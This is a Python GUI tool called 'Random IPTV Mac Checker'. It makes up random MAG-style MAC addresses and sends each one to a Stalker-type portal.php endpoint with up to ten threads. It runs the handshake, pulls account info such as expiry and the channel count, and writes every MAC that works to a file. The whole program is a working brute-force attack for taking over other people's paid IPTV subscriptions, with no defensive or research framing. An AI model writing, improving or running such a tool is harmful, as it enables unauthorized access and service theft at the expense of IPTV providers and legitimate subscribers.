import requests
import json
import random
import threading
import tkinter as tk
from tkinter import scrolledtext
from urllib.parse import urlparse
import base64
from PIL import Image, ImageTk
import io
from datetime import datetime
import tempfile
import os

class MacCheckerApp:
    def __init__(self, master):
        self.master = master
        self.master.title("Random IPTV Mac Checker")
        self.master.protocol("WM_DELETE_WINDOW", self.on_closing)

        # Set the window icon using a base64-encoded image
        icon_data = ("iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAAIGNIUk0AAHomAACAhAAA+gAAAIDoAAB1MAAA6mAAADqYAAAXcJy6UTwAAAFEUExURQAAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAABEAAP////swTbIAAABqdFJOUwAAAQ5foub6786BRAgPZuL4/vHRTwp46nHJ/MP3/bjkVk2j7d+JSW7ytG2yBwQ4pSEDG8UrtXNZoaunilqPkxI3zO7ne4Lo84xQ0/DenBoiXX+/qFg8XHypl2HHvL3EwkJDuewcM9iGEAL/x//9AAAAAWJLR0RrUmWlmAAAAAd0SU1FB+gLAxY0DY6W/TgAAADISURBVBjTY2BgYGJmYWVj5+Dk4uZhZAABXj5+gaysLEEhYRFRsICYeBYUsEmABSSlYAJS0mAB9iw4kAELcGTJyoLMkJLNEgALyMkrKCopq6iqqWtoggW0tHV09ST1DQyNjEXAAiamZuYWllbWNrZ29mABB0cnZxUXVxU3dw9esICnl5uMgJMTu7ePrx9YwD8gMEhAVkojOCQU4lJGxrDwCCttu0g9BihgjIqOiZWLi0+ACyQmeUvJJpulwAQYmFMDhdPSMzJBbABSPiiLTyeG8AAAACV0RVh0ZGF0ZTpjcmVhdGUAMjAyNC0xMS0wM1QyMjo1MjoxMiswMDowMGTV5jAAAAAldEVYdGRhdGU6bW9kaWZ5ADIwMjQtMTEtMDNUMjI6NTI6MTIrMDA6MDAViF6MAAAAKHRFWHRkYXRlOnRpbWVzdGFtcAAyMDI0LTExLTAzVDIyOjUyOjEzKzAwOjAw5Op05wAAAABJRU5ErkJggg==")
        icon_data = base64.b64decode(icon_data)
        self.icon_image = Image.open(io.BytesIO(icon_data))
        self.master.iconphoto(False, ImageTk.PhotoImage(self.icon_image))

        self.running = False
        self.threads = []
        self.output_file = None

        # Load previous settings
        self.load_settings()

        # Frame for the input and buttons
        input_frame = tk.Frame(master)
        input_frame.pack(pady=10)

        # Input for IPTV link
        tk.Label(input_frame, text="Enter IPTV link:").pack(side=tk.LEFT)
        self.iptv_link_entry = tk.Entry(input_frame, width=40)
        self.iptv_link_entry.insert(0, self.saved_url)  # Set saved URL
        self.iptv_link_entry.pack(side=tk.LEFT, padx=5)

        # Input for number of concurrent tests
        tk.Label(input_frame, text="Speed:").pack(side=tk.LEFT, padx=(10, 1))
        self.concurrent_tests = tk.Spinbox(input_frame, from_=1, to=10, width=5)  # Limit max to 10
        self.concurrent_tests.delete(0, tk.END)  # Delete current value
        self.concurrent_tests.insert(0, str(self.saved_speed))  # Insert saved speed
        self.concurrent_tests.pack(side=tk.LEFT)

        # Start/Stop button
        self.start_button = tk.Button(input_frame, text="Start", command=self.start_testing)
        self.start_button.pack(side=tk.LEFT)

        self.stop_button = tk.Button(input_frame, text="Stop", command=self.stop_testing, state=tk.DISABLED)
        self.stop_button.pack(side=tk.LEFT, padx=(5, 15))

        # MAC being tested
        self.mac_label = tk.Label(master, text="Testing MAC address will appear here.")
        self.mac_label.pack(pady=5)

        # Output area for testing logs
        self.output_text = scrolledtext.ScrolledText(master, width=60, height=10, padx=10, pady=10)
        self.output_text.pack(padx=10, pady=(20, 5))

        # Output area for error logs
        self.error_text = scrolledtext.ScrolledText(master, width=60, height=5, padx=10, pady=10, bg="lightyellow")
        self.error_text.pack(padx=10, pady=(0, 20))

    def load_settings(self):
        # Try to load settings from a JSON file in the temp folder
        temp_dir = tempfile.gettempdir()
        settings_file = os.path.join(temp_dir, "mac_checker_settings.json")

        if os.path.exists(settings_file):
            with open(settings_file, 'r') as file:
                try:
                    settings = json.load(file)
                    self.saved_url = settings.get('url', '')
                    self.saved_speed = settings.get('speed', 1)
                except json.JSONDecodeError:
                    self.saved_url = ''
                    self.saved_speed = 1
        else:
            self.saved_url = ''
            self.saved_speed = 1

    def save_settings(self):
        # Save current settings (URL and speed) to a JSON file
        settings = {
            'url': self.iptv_link_entry.get(),
            'speed': int(self.concurrent_tests.get())
        }

        temp_dir = tempfile.gettempdir()
        settings_file = os.path.join(temp_dir, "mac_checker_settings.json")

        with open(settings_file, 'w') as file:
            json.dump(settings, file)

    def generate_random_mac(self, prefix="00:1A:79:"):
        return f"{prefix}{random.randint(0, 255):02X}:{random.randint(0, 255):02X}:{random.randint(0, 255):02X}"

    def log_error(self, message):
        self.error_text.insert(tk.END, message + "\n")
        self.error_text.see(tk.END)

    def get_output_filename(self):
        current_time = datetime.now().strftime("%Y%m%d_%H%M%S")
        sanitized_url = self.base_url.replace("http://", "").replace("https://", "").replace("/", "_").replace(":", "-")
        filename = f"{sanitized_url}_{current_time}.txt"
        return filename

    def start_testing(self):
        self.running = True
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)

        self.iptv_link = self.iptv_link_entry.get()
        self.parsed_url = urlparse(self.iptv_link)
        self.host = self.parsed_url.hostname
        self.port = self.parsed_url.port or 80
        self.base_url = f"http://{self.host}:{self.port}"

        num_tests = int(self.concurrent_tests.get())
        # Limit to a maximum of 10 concurrent tests
        if num_tests > 10:
            num_tests = 10

        # Save current settings to a file
        self.save_settings()

        # Start threads to test MACs
        for _ in range(num_tests):
            thread = threading.Thread(target=self.test_macs)
            thread.start()
            self.threads.append(thread)

    def log_output(self, message):
        self.output_text.insert(tk.END, message + "\n")
        self.output_text.see(tk.END)

        # Check if output_file is initialized before writing to it
        if self.output_file is not None:
            self.output_file.write(message + "\n")
            self.output_file.flush()  # Ensure data is written immediately
        
    def test_macs(self):
        while self.running:
            mac = self.generate_random_mac()
            self.mac_label.config(text=f"Testing MAC: {mac}")

            try:
                s = requests.Session()
                s.cookies.update({'mac': mac})
                url = f"{self.base_url}/portal.php?action=handshake&type=stb&token=&JsHttpRequest=1-xml"

                res = s.get(url, timeout=10, allow_redirects=False)
                if res.text:
                    data = json.loads(res.text)
                    tok = data['js']['token']

                    url2 = f"{self.base_url}/portal.php?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
                    headers = {"Authorization": f"Bearer {tok}"}
                    res2 = s.get(url2, headers=headers, timeout=10, allow_redirects=False)

                    if res2.text:
                        data = json.loads(res2.text)
                        if 'js' in data and 'mac' in data['js'] and 'phone' in data['js']:
                            mac = data['js']['mac']
                            expiry = data['js']['phone']

                            url3 = f"{self.base_url}/portal.php?type=itv&action=get_all_channels&JsHttpRequest=1-xml"
                            res3 = s.get(url3, headers=headers, timeout=10, allow_redirects=False)
                            count = 0

                            if res3.status_code == 200:
                                channels_data = json.loads(res3.text)["js"]["data"]
                                count = len(channels_data)

                            # Create the output file only when a valid MAC is found
                            if count > 0:
                                if self.output_file is None:  # Check if output_file is uninitialized
                                    output_filename = self.get_output_filename()
                                    self.output_file = open(output_filename, "a")  # Open file in append mode

                                result_message = f"{self.iptv_link}\nMAC = {mac}\nExpiry = {expiry}\nChannels = {count}\n"
                                self.log_output(result_message)
                            else:
                                result_message = f"There are no channels for MAC: {mac}"
                                self.log_output(result_message)

                    else:
                        self.log_error(f"No JSON response for MAC {mac}")
            except (json.decoder.JSONDecodeError, requests.exceptions.RequestException) as e:
                self.log_error(f"Error for MAC {mac}: {str(e)}")

        # Update buttons when exiting the thread
        if not self.running:
            self.start_button.config(state=tk.NORMAL)
            self.stop_button.config(state=tk.DISABLED)

    def stop_testing(self):
        self.running = False
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)

        if hasattr(self, 'output_file') and self.output_file:
            self.output_file.close()

    def on_closing(self):
        self.stop_testing()
        self.master.destroy()

if __name__ == "__main__":
    root = tk.Tk()
    app = MacCheckerApp(root)
    root.mainloop()
